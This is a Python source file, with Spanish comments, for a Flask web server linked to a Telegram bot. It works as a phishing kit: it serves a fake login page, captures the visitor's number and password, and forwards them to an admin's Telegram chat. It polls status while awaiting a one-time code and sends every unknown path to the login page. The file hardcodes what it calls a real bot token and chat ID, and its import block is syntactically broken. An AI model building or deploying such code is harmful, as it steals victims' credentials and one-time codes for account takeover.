"""
Servidor Flask + Bot de Telegram
Proyecto sin PHP - Solo Python
"""

from flask import Flask, render_template, request, jsonify, redirect, url_for
import threading
from datetime import datetime
import secrets
import asyncio
import logging
import os

# Importar el bot desde telegram_bot.py
from telegram_bot import (
    crear_bot_application,
    enviar_notificacion_admin,
    usuarios_activos,
    BOT_TOKEN = "7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc"  # Tu token real
ADMIN_CHAT_ID = "6958936698"  # Tu chat ID real
)

# Configurar logging
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========================================
# CONFIGURACIÓN
# ========================================

# Inicializar Flask
app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# Variables globales para el bot
bot_app = None
loop = None

# ========================================
# RUTAS DE LA APLICACIÓN WEB
# ========================================

@app.route('/')
def index():
    """Página principal de login"""
    logger.info("📄 Cargando página de login")
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    """Procesa el login y envía notificación a Telegram"""
    try:
        data = request.json
        numero = data.get('numero', '').strip()
        clave = data.get('clave', '').strip()
        
        logger.info(f"🔐 Intento de login: {numero}")
        
        if not numero or not clave:
            return jsonify({'success': False, 'message': 'Datos incompletos'}), 400
        
        # Generar sesión única
        session_id = secrets.token_hex(8)
        
        # Guardar datos en la base de datos compartida
        usuarios_activos[session_id] = {
            'numero': numero,
            'clave': clave,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'status': 'esperando',
            'codigo_dinamico': None
        }
        
        logger.info(f"✅ Sesión creada: {session_id}")
        
        # Enviar notificación al admin vía Telegram
        if loop and bot_app:
            asyncio.run_coroutine_threadsafe(
                enviar_notificacion_admin(session_id, numero, clave, bot_app.bot),
                loop
            )
            logger.info(f"📤 Notificación enviada a Telegram")
        else:
            logger.error("❌ Bot no está disponible")
        
        return jsonify({'success': True, 'session_id': session_id})
    
    except Exception as e:
        logger.error(f"❌ Error en login: {e}")
        return jsonify({'success': False, 'message': 'Error del servidor'}), 500

@app.route('/check_status')
def check_status():
    """Verifica el estado de una sesión"""
    session_id = request.args.get('session', '').strip()
    
    if not session_id:
        return jsonify({'status': 'error', 'message': 'Session ID requerido'}), 400
    
    if session_id in usuarios_activos:
        user_data = usuarios_activos[session_id]
        return jsonify({
            'status': user_data['status'],
            'message': user_data.get('message', '')
        })
    
    return jsonify({'status': 'error', 'message': 'Sesión no encontrada'}), 404

@app.route('/exito')
def exito():
    """Página de éxito"""
    return render_template('exito.html')

@app.route('/health')
def health():
    """Health check para Render"""
    bot_status = "activo" if bot_app else "inactivo"
    return jsonify({
        'status': 'ok',
        'bot': bot_status,
        'sesiones_activas': len(usuarios_activos),
        'timestamp': datetime.now().isoformat()
    })

# Ruta catch-all para evitar 404
@app.route('/<path:path>')
def catch_all(path):
    """Redirige cualquier ruta desconocida al login"""
    logger.warning(f"⚠️ Ruta no encontrada: /{path} - Redirigiendo a login")
    return redirect(url_for('index'))

# ========================================
# INICIALIZACIÓN DEL BOT
# ========================================

def run_bot():
    """Ejecuta el bot en un thread separado"""
    global bot_app, loop
    
    # Crear nuevo event loop para este thread
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    # Crear aplicación del bot
    bot_app = crear_bot_application()
    
    logger.info(f"🤖 Bot iniciado - Admin ID: {ADMIN_CHAT_ID}")
    
    # Iniciar polling
    bot_app.run_polling(
        allowed_updates=['message', 'callback_query'],
        drop_pending_updates=True
    )

# ========================================
# INICIAR APLICACIÓN
# ========================================

if __name__ == '__main__':
    print("\n" + "="*50)
    print("🚀 INICIANDO SISTEMA COMPLETO")
    print("="*50)
    
    # Verificar configuración
    if BOT_TOKEN == "TU_TOKEN_DE_BOTFATHER":
        print("❌ ERROR: Configura BOT_TOKEN en telegram_bot.py")
        print("📝 O usa variables de entorno")
        exit(1)
    
    if ADMIN_CHAT_ID == "TU_CHAT_ID":
        print("❌ ERROR: Configura ADMIN_CHAT_ID en telegram_bot.py")
        exit(1)
    
    # Iniciar bot en thread separado
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Esperar a que el bot se inicialice
    import time
    time.sleep(3)
    
    print("="*50)
    print("✅ SISTEMA INICIADO CORRECTAMENTE")
    print("="*50)
    print(f"🌐 Servidor Web: http://0.0.0.0:5000")
    print(f"🤖 Bot Telegram: Activo")
    print(f"👤 Admin ID: {ADMIN_CHAT_ID}")
    print(f"📝 Sesiones: {len(usuarios_activos)}")
    print("="*50 + "\n")
    
    # Iniciar servidor Flask
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
